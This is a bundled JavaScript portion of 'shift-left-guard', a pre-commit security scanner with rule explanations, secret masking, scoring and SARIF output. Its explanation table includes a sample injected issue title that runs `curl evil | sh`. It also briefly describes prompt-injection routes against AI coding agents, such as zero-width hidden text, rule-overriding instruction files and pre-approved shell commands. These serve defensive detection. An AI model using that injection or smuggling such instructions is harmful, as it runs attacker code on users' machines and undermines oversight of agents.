      snippet: (lines[index] ?? "").trim().slice(0, 160)
    });
  }, runIndent = -1;
  lines.forEach((line, index) => {
    let indent = line.length - line.trimStart().length, run = /^(\s*)(-\s*)?(run|script):\s*(.*)$/.exec(line), inRunBlock = !1;
    if (run)
      inRunBlock = !0, runIndent = /^[|>]/.test(run[4] ?? "") ? indent : -1;
    else if (runIndent >= 0)
      if (line.trim() === "" || indent > runIndent)
        inRunBlock = !0;
      else
        runIndent = -1;
    for (let rule of rules) {
      let hit = rule.line?.(line, { inRunBlock, text, lines, index, path });
      if (hit)
        add(rule, index, hit === !0 ? rule.severity : hit);
    }
  });
  for (let rule of rules) {
    let index = rule.file?.(lines) ?? -1;
    if (index >= 0)
      add(rule, index);
  }
  return findings.sort((a, b) => rank(b.severity) - rank(a.severity) || a.line - b.line);
}, introduced = (before, after) => {
  let seen = /* @__PURE__ */ new Map;
  for (let f of before)
    seen.set(`${f.id}\x00${f.snippet}`, (seen.get(`${f.id}\x00${f.snippet}`) ?? 0) + 1);
  return after.filter((f) => {
    let key = `${f.id}\x00${f.snippet}`, left = seen.get(key) ?? 0;
    if (left > 0)
      return seen.set(key, left - 1), !1;
    return !0;
  });
};
var ICON = { critical: "\uD83D\uDFE5", high: "\uD83D\uDFE7", medium: "\uD83D\uDFE8", low: "⬜" }, SECRET_RULES = /* @__PURE__ */ new Set(["SEC001", "SEC002", "DKR003", "TF005", "CMP004", "AGT004"]), mask = (line) => line.replace(/([=:]\s*["']?)([^"'\s,;)]{4,})/g, (_, lead, value) => `${lead}${value.slice(0, 3)}****`).replace(/\b([A-Za-z0-9_-]{3})[A-Za-z0-9_\-+/]{12,}\b(?!\s*[=:])/g, "$1****"), shown = (f) => SECRET_RULES.has(f.id) ? mask(f.snippet) : f.snippet, EXPLAIN = {
  GHA001: { cwe: 829, why: "A tag like @v4 can be moved to new code at any time; if the action's repo is compromised, your pipeline runs the attacker's code with your secrets (tj-actions/changed-files, 2025)." },
  GHA002: { cwe: 829, why: `pull_request_target runs with write access and secrets; checking out the PR's code lets any outside contributor run their code with them ("pwn request").` },
  GHA003: { cwe: 78, why: 'An issue title is attacker-controlled text; inside run: it becomes part of the shell script, so a title like `a"; curl evil | sh; "` runs on your runner.' },
  GHA004: { cwe: 250, why: "Every step, including third-party actions, gets a token that can push code, publish releases and change settings. One compromised step owns the repo." },
  GHA005: { cwe: 250, why: "Without a permissions block the token gets the repository default, often read-write. Least privilege limits what a compromised step can do." },
  GHA006: { cwe: 532, why: "Inline secrets are pasted into the generated script, where they can leak through logs, error messages or the process list." },
  DKR001: { cwe: 1104, why: "latest changes under you: today's build and tomorrow's are different images, and a compromised upstream tag lands in production unreviewed." },
  DKR002: { cwe: 250, why: "A process running as root inside the container is one kernel or runtime bug away from root on the host." },
  DKR003: { cwe: 538, why: "ENV and ARG values are stored in the image layers; anyone who can pull the image can read them with `docker history`." },
  DKR004: { cwe: 494, why: "ADD silently downloads URLs and unpacks archives, without checksum, which makes it easy to pull in something you did not review." },
  DKR005: { cwe: 494, why: "Piping a download into a shell runs whatever the server sends today, with no check that it is the script you reviewed." },
  TF001: { cwe: 284, why: "Bots scan the whole IPv4 space in minutes; an open SSH, RDP or database port is found and attacked within hours." },
  TF002: { cwe: 284, why: "Public buckets are the most common cloud data leak: anyone with the URL can list and download everything in them." },
  TF003: { cwe: 269, why: "Owner/admin rights let one leaked credential delete or take over the whole project, not just the service that needed access." },
  TF004: { cwe: 284, why: "A database on a public IP is exposed to password guessing and unpatched-server exploits from the entire internet." },
  TF005: { cwe: 798, why: "Terraform files end up in git, plan output and state; a password written there is readable by everyone with repo access, forever, in history." },
  TF006: { cwe: 311, why: "Without encryption, a stolen disk, snapshot or backup exposes the data in plain text, and many compliance regimes forbid it." },
  TF007: { cwe: 693, why: "Without deletion protection, one wrong apply or destroy wipes a stateful resource and its data." },
  K8S001: { cwe: 250, why: "A privileged container can access every device of the node; escaping to the host is trivial." },
  K8S002: { cwe: 668, why: "Sharing the host's network, process list or file system lets the pod see and tamper with other workloads on the node." },
  K8S003: { cwe: 250, why: "Running as root or allowing escalation turns any code-execution bug in the app into root inside the container, one step from the node." },
  K8S004: { cwe: 1104, why: "Unpinned images make rollbacks and audits impossible: you cannot tell which code actually ran." },
  CMP001: { cwe: 250, why: "A privileged container can access every device of the host; escaping to the host is trivial." },
  CMP002: { cwe: 250, why: "Access to the Docker socket is root on the host: the container can start a new privileged container that mounts /." },
  CMP003: { cwe: 668, why: "Host namespaces remove the isolation between the container and the machine: it sees host processes and every port." },
  CMP004: { cwe: 798, why: "Compose files are committed and shared; a password written there is readable by everyone with repo access, forever, in history." },
  CMP005: { cwe: 1104, why: "latest changes under you, so two developers and the server run different code with the same compose file." },
  NPM001: { cwe: 506, why: "Install scripts run on every machine that installs the package; this is how most npm supply-chain attacks steal tokens (event-stream, ua-parser-js)." },
  NPM002: { cwe: 829, why: "A git or URL dependency skips the registry's immutability: the branch or file can change to malicious code without a new version." },
  NPM003: { cwe: 1104, why: "Any-version ranges install whatever was published last, including a hijacked release." },
  AGT001: { cwe: 862, why: "With every shell command pre-approved, a prompt injection in a file, web page or issue can make the agent run anything on your machine without asking you." },
  AGT002: { cwe: 693, why: "These switches turn off the checks between the agent and your machine, or start any MCP server a cloned repository brings, with your credentials." },
  AGT003: { cwe: 829, why: "An unpinned MCP server downloads and runs the newest package on every start, with access to your tokens; one hijacked release is enough." },
  AGT004: { cwe: 798, why: "Agent config is committed and shared; a token written there leaks to everyone with repo access and to every tool that reads the config." },
  AGT005: { cwe: 451, why: "Zero-width characters hide text from human reviewers while the model still reads it: a classic way to smuggle instructions into a prompt." },
  AGT006: { cwe: 77, why: "Instruction files are read as trusted prompts by every session; text that overrides rules or hides actions is prompt injection." },
  AGT007: { cwe: 494, why: "Hooks run automatically on every event with your permissions; a downloaded script can change at any time." },
  AGT008: { cwe: 693, why: "Switching a rule off silences it for everyone in the repo, so the decision deserves a human review." },
  SEC001: { cwe: 321, why: "Anyone with repo access, now or later via history, can use the key; deleting the file does not remove it from git history." },
  SEC002: { cwe: 798, why: "Leaked keys are scraped from public repos within minutes and used for crypto mining, data theft or spam on your bill." },
  SEC003: { cwe: 451, why: "Bidirectional control characters make code display differently than it compiles, so a reviewer approves something other than what runs (CVE-2021-42574)." },
  SEC004: { cwe: 538, why: "A .env file usually holds real credentials; if git does not ignore it, the next `git add .` commits them." }
}, formatFindings = (path, findings, explain = !1) => findings.map((f) => {
  let why = explain ? EXPLAIN[f.id] : void 0, lesson = why ? `
   why: ${why.why} (CWE-${why.cwe}: https://cwe.mitre.org/data/definitions/${why.cwe}.html)` : "";
  return `${ICON[f.severity]} ${f.id} [${f.severity}] ${base(path)}:${f.line}: ${f.title}
   ${shown(f)}
   fix: ${f.fix}${lesson}`;
}).join(`
`);
var PENALTY = { critical: 25, high: 10, medium: 3, low: 1 }, scoreOf = (findings) => {
  let score = Math.max(0, 100 - findings.reduce((sum, f) => sum + PENALTY[f.severity], 0)), grade = score >= 90 ? "A" : score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";
  return { score, grade };
}, GRADE_COLOR = { A: "brightgreen", B: "green", C: "yellow", D: "orange", F: "red" };
var BADGE_FILE = ".github/shift-left-guard.json", badgeJson = (score, grade) => `${JSON.stringify({ schemaVersion: 1, label: "shift-left-guard", message: `${grade} · ${score}/100`, color: GRADE_COLOR[grade] }, null, 2)}
`;
var badgeMarkdown = (grade, fileUrl) => fileUrl === void 0 ? `[![shift-left-guard: ${grade}](https://img.shields.io/badge/shift--left--guard-${grade}-${GRADE_COLOR[grade]})](https://github.com/PascalNehlsen/shift-left-guard)` : `[![shift-left-guard](https://img.shields.io/endpoint?url=${encodeURIComponent(fileUrl)})](https://github.com/PascalNehlsen/shift-left-guard)`;

// cli/guard-scan.ts
var args = process.argv.slice(2), paths = args.filter((a) => !a.startsWith("--")), isAll = args.includes("--all") || paths.length > 0, blockAt = args.find((a) => a.startsWith("--block-at="))?.split("=")[1] ?? "high", format = args.find((a) => a.startsWith("--format="))?.split("=")[1] ?? "text";
if (format !== "text" && format !== "sarif")
  console.error(`shift-left-guard: unknown --format=${format} (text or sarif)`), process.exit(2);
var git = (...argv) => {
  try {
    return execFileSync("git", argv, { encoding: "utf8", maxBuffer: 67108864, stdio: ["ignore", "pipe", "ignore"] });
  } catch {
    return;
  }
}, readFile = (path) => {
  try {
    return readFileSync(path, "utf8");
  } catch {
    return;
  }
}, isText = (text) => text.length < 1e6 && !text.includes("\x00"), files = (paths.length > 0 ? paths.join("\x00") : isAll ? git("ls-files", "-z") : git("diff", "--cached", "--name-only", "--diff-filter=ACMR", "-z"))?.split("\x00").filter(Boolean);
if (files === void 0)
  console.error("shift-left-guard: not a git repository"), process.exit(2);
var top = git("rev-parse", "--show-toplevel")?.trim(), { config, errors } = parseConfig(top === void 0 ? void 0 : readFile(`${top}/${CONFIG_FILE}`));
for (let error of errors)
  console.error(`shift-left-guard: ${CONFIG_FILE}: ${error}`);
var color = process.stdout.isTTY ? (code, text) => `\x1B[${code}m${text}\x1B[0m` : (_, text) => text, blocking = 0, other = 0, results = [];
for (let path of files) {
  let after = isAll ? readFile(path) : git("show", `:${path}`);
  if (after === void 0 || !isText(after))
    continue;
  let found = isAll ? scan(path, after, config) : introduced(scan(path, git("show", `HEAD:${path}`) ?? "", config), scan(path, after, config));
  if (isEnvFile(path) && !config.disabled.has("SEC004") && (!isAll || envHasSecrets(after)))
    found.unshift(envFinding(path));
  if (found.length === 0)
    continue;
  let stop = found.filter((f) => rank(f.severity) >= rank(blockAt));
  if (blocking += stop.length, other += found.length - stop.length, results.push(...found.map((finding) => ({ path, finding }))), format === "text")
    console.log(formatFindings(path, found)), console.log();
}
if (format === "sarif") {
  let level = (s) => s === "critical" || s === "high" ? "error" : s === "medium" ? "warning" : "note", rules = [...RULES, ...config.rules], used = [...new Set(results.map((r) => r.finding.id))];
  console.log(JSON.stringify({
    $schema: "https://json.schemastore.org/sarif-2.1.0.json",
    version: "2.1.0",
    runs: [
      {
        tool: {
          driver: {
            name: "shift-left-guard",
            informationUri: "https://github.com/PascalNehlsen/shift-left-guard",
            rules: used.map((id) => {
              let rule = rules.find((r) => r.id === id);
              return {
                id,
                shortDescription: { text: rule?.title ?? id },
                help: { text: rule?.fix ?? "" },
                defaultConfiguration: { level: level(rule?.severity ?? "medium") },
                properties: { "security-severity": { critical: "9.5", high: "7.5", medium: "5.0", low: "2.0" }[rule?.severity ?? "medium"] }
              };
            })
          }
        },
        results: results.map(({ path, finding }) => ({
          ruleId: finding.id,
          ruleIndex: used.indexOf(finding.id),
          level: level(finding.severity),
          message: { text: `${finding.title}. Fix: ${finding.fix}` },
          locations: [{ physicalLocation: { artifactLocation: { uri: path }, region: { startLine: finding.line } } }]
        }))
      }
    ]
  }, null, 2)), process.exit(blocking > 0 ? 1 : 0);
}
if (isAll) {
  let { score, grade } = scoreOf(results.map((r) => r.finding));
  if (console.log(color(grade <= "B" ? 32 : grade === "C" ? 33 : 31, `\uD83D\uDEE1 Security score: ${score}/100 · grade ${grade}`)), args.includes("--badge"))
    console.log(badgeMarkdown(grade));
  if (args.includes("--badge-file") && top !== void 0)
    mkdirSync(`${top}/.github`, { recursive: !0 }), writeFileSync(`${top}/${BADGE_FILE}`, badgeJson(score, grade)), console.log(`Wrote ${BADGE_FILE}`);
}
if (blocking > 0)
  console.log(color(31, `\uD83D\uDEE1 shift-left-guard: ${blocking} issue(s) at or above ${blockAt}. Commit stopped.`)), console.log(color(2, "   Fix them, silence a line with `# guard:ignore <ID>`, or skip once with `git commit --no-verify`.")), process.exit(1);
if (other > 0)
  console.log(color(33, `\uD83D\uDEE1 shift-left-guard: ${other} lower-severity issue(s), not blocking.`));
